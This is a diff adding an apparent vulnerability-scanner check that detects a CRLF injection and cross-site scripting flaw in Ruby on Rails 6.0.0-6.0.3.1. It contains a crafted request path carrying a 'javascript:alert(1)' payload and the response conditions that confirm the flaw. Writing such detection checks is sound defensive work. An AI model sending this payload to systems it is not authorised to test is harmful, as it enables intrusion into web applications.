@@ -1,0 +1,24 @@
+metadata:
+	language: v1-beta
+	name: "Ruby on Rails - CRLF Injection and Cross-Site Scripting"
+	author: "Parimal Shaw"
+	description: "Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript to be injected into the response, resulting in cross-site scripting."
+	tags: "Rails CRLF and XSS"
+
+define:
+    potential_path = "/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa"
+
+
+given host then
+    send request called check:
+	method: "POST"
+	path: {potential_path}
+	  
+	  
+	  if {check.response.status_code} is "302" and "javascript:alert(1)" in {check.response.body} and "Location: aaaaa" in {check.response.headers} and "text/html" in {check.response.headers} then
+	  report issue:
+            severity: medium
+            confidence: certain
+            detail: `Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript to be injected into the response, resulting in cross-site scripting.`
+            remediation: "Ensure the location value is set as default value and XSS,CRLF payloads should be Blocked by application"
+end if
